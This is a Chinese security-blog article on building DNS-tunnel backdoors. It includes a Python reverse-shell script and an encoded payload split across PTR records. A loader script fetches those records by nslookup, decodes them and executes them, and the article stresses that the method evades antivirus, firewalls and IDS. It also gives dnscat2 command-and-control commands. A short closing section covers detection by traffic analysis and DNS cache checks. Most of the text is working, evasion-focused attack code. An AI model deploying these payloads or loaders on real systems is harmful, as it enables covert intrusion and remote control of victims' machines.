***本文作者：rotgrass，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

 **使用DNS隧道技术可以有效地进行数据交换，当然，也可以使用DNS隧道技术进行后门的制作。**

## 0x00 背景

要理解DNS后门，首先要对DNS协议有所了解。DNS解析过程在此不多赘述，只提到一点：DNS解析中的PTR记录，它与A记录相反，是将IP地址解析为域名。如下图，如果这时向这个DNS服务器请求1.1.1.100的PTR记录，反向解析到的域名就是test.com
。

![请求1.1.1.100的PTR记录](https://image.3001.net/images/20180925/1537842267_5ba99c5b02607.png!small)

需要了解的是PTR记录的两个特性：

> 1\. 大小写不敏感。在PTR记录中，如果DNS服务器上的主机名包含大写，DNS解析的结果中会全部转换为小写。所以域名也并不区分大小写。

> 2\.
> 格式不定。一个正常的域名至少需要一个后缀（.com、.net），并且不可出现“-”以外的特殊符号。但是在写PTR记录时，可以选择任意格式，也可以出现包括“!@#$%^&*()_+=/?<>”在内的各种特殊字符，甚至是空格，只有反斜杠“\”会被过滤。

不仅仅是PTR记录，其他的例如TXT记录、MX记录等，都可以达到类似的效果，甚至存放的内容没有字符和长度限制，只是配置方法略有不同。

## 0x01 初窥门径

我们已经知道了DNS中的PTR记录可以存放几乎任何我们想要的东西，接下来的要说DNS后门的利用的设计思路。我们可以将payload放在PTR记录中，做好IP和域名的映射。只要在被攻击者主机上用DNS协议反向解析这个IP
，payload就会被接收。最重要的一点在于，大部分的防火墙、入侵检测系统和态势感知系统并不会审计DNS协议，所以这段流量几乎是不会被拦截的；并且这段paylaod并不会被保存在文件中，而是存在内存里，也可以绕过本地杀软的查杀。

模拟一个场景，在DNS服务器上创建数个PTR记录，将一段payload拆分成三个部分，因为域名有长度限制，无法全部放入，并且拆分后可以有效避免被审查。再将1.1.1.1-1.1.1.3的IP分别映射这三段payload。

![分别映射这三段payload](https://image.3001.net/images/20180925/1537842436_5ba99d04092aa.jpg!small)

只要向这台DNS服务器请求反向解析这三个IP，就可以接收到这段payload。

![接收到这段payload](https://image.3001.net/images/20180925/1537842540_5ba99d6c7db24.jpg!small)

下面来看一个实例，这有一个简短的python弹shell脚本：

    
    
    import socket,subprocess,os
    s=socket.socket()
    s.connect(("",))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

使用VirusTotal进行检测，顺利通过了所有厂商的查杀。相比之下，相同功能的可执行文件被查杀几率就高了很多。

![被查杀几率就高了很多](https://image.3001.net/images/20180925/1537842642_5ba99dd2d252f.png!small)

在这里我只截取以下部分作为测试，连接的目标地址为攻击者IP及端口号。

    
    
    import socket
    s=socket.socket()
    s.connect(("x.x.x.x",xxxx))

接下来就是将这段payload放入DNS服务器中的PTR记录里，为了方便起见，将其做base64编码处理，因为编码后的字符中存在大写，前文提到过PTR解析结果中全部为小写，所以将其再进行ASCII编码，最终的结果为：

    
    
    \u0061\u0057\u0031\u0077\u0062\u0033\u004a\u0030\u0049\u0048\u004e\u0076\u0059\u0032\u0074\u006c\u0064\u0043\u0078\u007a\u0064\u0048\u004a\u0031\u0059\u0033\u0051\u004b\u0063\u007a\u0031\u007a\u0062\u0032\u004e\u0072\u005a\u0058\u0051\u0075\u0063\u0032\u0039\u006a\u0061\u0032\u0056\u0030\u004b\u0044\u0049\u0073\u004d\u0053\u006b\u004b\u0063\u0079\u0035\u006a\u0062\u0032\u0035\u0075\u005a\u0057\u004e\u0030\u004b\u0043\u0067\u006e\u004d\u0054\u006b\u0079\u004c\u006a\u0045\u0032\u004f\u0043\u0034\u0078\u004d\u0044\u0045\u0075\u004d\u0054\u0049\u0035\u004a\u0079\u0077\u0035\u004f\u0054\u006b\u0035\u004b\u0053\u006b\u004b\u0043\u0067\u003d\u003d

在DNS服务器上创建PTR记录，将最终编码后的payload拆分，并全部存入其中，建立IP和payload的反向解析。

![建立IP和payload的反向解析](https://image.3001.net/images/20180925/1537842800_5ba99e7097d4d.png!small)

最后只要在被攻击者主机上请求这些IP的DNS反向解析，就可以获取到完整的payload，我写了一个简单的python脚本来完成这个操作。可以获取到所有分段后的payload，进行组合、解码并执行。192.168.101.144是DNS服务器的地址。

    
    
    import os
    payload=''
    ip=raw_input('please input payload ip range:')
    count=raw_input('please input count:')
    for i in range(1,int(count)+1):
        domain=ip+str(i) 
        p=os.popen('nslookup -qt=ptr '+domain+' 192.168.101.144') 
        res=p.read().split('\n') 
        if res[0]=="\xb7\xfe\xce\xf1\xc6\xf7: UnKnown":
            del res[0] 
        payload_raw=res[2].split(":")[1].strip() 
        payload+=payload_raw
    payload=payload.replace('u','\u').decode('unicode_escape')
    payload='''python -c \"exec(\''''+ payload+ ''''.decode('base64'))"'''
    os.popen(payload)

在执行这段脚本时，需要输入IP的网段和数量。

IP网段格式为“x.x.x.”，这是在DNS服务器上建立PTR协议的IP网段，数量是PTR记录的数量，也就是payload被拆分后的个数。在这次测试中，网段为“1.1.1.”，数量是11。

脚本会调用nslookup命令获取PTR协议中的payload并解码执行，在攻击者主机上运行msf，监听对应的端口，就可以收到一个弹回的shell。

![收到一个弹回的shell](https://image.3001.net/images/20180925/1537843057_5ba99f71dc488.png!small)

用wireshark抓包查看，传递payload的过程完全是通过DNS协议进行的。分段的payload被放在Domain
Name字段中，但是没有反斜杠“\”，前文中提到过，反斜杠被过滤掉了。

![用wireshark抓包查看](https://image.3001.net/images/20180925/1537843104_5ba99fa019be3.png!small)

![用wireshark抓包查看](https://image.3001.net/images/20180925/1537843136_5ba99fc098a9b.png!small)

也可以看到发送连接的TCP数据包，目标地址正是攻击者的IP。

![目标地址正是攻击者的IP](https://image.3001.net/images/20180925/1537843159_5ba99fd7bb9f3.png!small)

问题也随之而来，虽然在传输payload的过程中使用了DNS协议，可以规避大部分检测，但是弹shell时使用了TCP协议建立连接，极容易被AF等防护设备监测到，在被攻击主机上使用TCPView等工具也可以很快就发现连接。

## 0x02 深入分析

既然使用TCP协议被检测出的可能性很高，那么使用无连接的UDP协议进行信息交互的隐蔽性就强了很多，采用DNS协议就是一个很好的选择。场景如下图，攻击者将命令通过DNS协议发送至被攻击者，被攻击者主机上的后门程序接收到指令，执行相应的操作。某些操作需要进行响应，也可以通过DNS协议发送。通过这种方式，可以很好的绕过安全防护设备；如果不进行修改注册表等敏感操作，本地的杀软也不会对其进行拦截，因为它仅仅发送大量DNS解析请求而已。

![发送大量DNS解析请求](https://image.3001.net/images/20180925/1537843254_5ba9a03673365.png!small)

不足之处在于传输文件时速度较为缓慢，因为需要将数据写入缓存中再进行读取，进行大量数据发送时很吃力。而且由于UDP协议的不可靠性，特别在网络环境较差的情况下，响应的完整性会受到极大的影响。

dnscat2就是这样一个使用DNS协议进行数据传输的C&C工具。采用了C/S架构，client端有Windows和Linux两种版本，server端只能在Linux上运行。client位于被控主机，server位于控制端。

Windows系统的client端启动命令如下，server处是控制端的IP。

    
    
    dnscat2-v0.07-client-win32.exe --dns server=x.x.x.x

server端需要安装ruby，启动命令为：

    
    
    ruby ./dnscat2.rb

成功连接后的效果如下

client端：

![client端](https://image.3001.net/images/20180925/1537843388_5ba9a0bc5ee99.png!small)

server端：

![server端](https://image.3001.net/images/20180925/1537843398_5ba9a0c6270c4.png!small)

在server端的使用方法与msf类似，每个连接都是一个window，使用window -i命令可以进入对应的window，help命令列出了所有的功能

    
    
    clear delay download echo exec help listen ping quit set shell shutdown suspend tunnels unset upload window windows

使用shell和sission命令，可以获得cmd shell：

![获得cmd
shell](https://image.3001.net/images/20180925/1537843454_5ba9a0fed87bc.png!small)

可以执行cmd命令：

![执行cmd命令](https://image.3001.net/images/20180925/1537843476_5ba9a114481f4.png!small)

对过程中的数据包进行抓取和分析。所有的数据均走DNS协议，每一条请求都有响应，数据中有明显的特征“dnscat”字段；在解析记录的选择上有MX、TXT、和CHAME三种，混合使用；由于dnscat2默认加密数据，所以不能从数据包中看出命令执行的原始数据。

![命令执行的原始数据](https://image.3001.net/images/20180925/1537843508_5ba9a13415029.png!small)

遗憾的是这个软件会被大多数厂商标记为恶意软件，如果你真的使用dnscat2当做后门来使用，马上就会被杀软和检测出。所以dnscat2仅仅作为一个思路上的参考，使用自己编写的脚本是最好的选择。

![使用自己编写的脚本](https://image.3001.net/images/20180925/1537843574_5ba9a176295a0.png!small)

以上的利用是最简单的直连，在复杂的真实环境下，需要根据情况的不同改变后门的工作模式，才能达到最好的效果。

## 0x03 检测

关于DNS检测有一些思路：

> 1\.
> 在后门进行传输数据时会产生大量的流量交互，尤其对于DNS后门来说，会产生大量的DNS协议数据，并且这些域名有很鲜明的特征。可以通过流量过滤对其进行检测。

对DNS流量的大小进行检测，在一定时间内有大量的DNS流量时，还要对数据的具体内容进行分析。有些未经过加密的数据中会有明显的命令执行、或者其他数据传输，加密过的数据会出现域名长度大、域名不合法等特征，根据这些特征进行检测。

> 2\. 利用DNS的缓存机制。主机在进行DNS
> 解析后，会将解析到的结果在缓存中保存一段时间，这段时间内如果有相同的解析需要，会直接从缓存中读取，而不向DNS服务器进行解析请求。

利用DNS后门进行数据传输会产生大量的解析请求和响应，在一定时间内这些数据都会被记录在DNS缓存中。可以使用ipconfig
/display读取缓存，对其中的异常数据进行筛选并过滤。

## 参考

> dnscat：<https://github.com/iagox86/dnscat2>

 ***本文作者：rotgrass，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

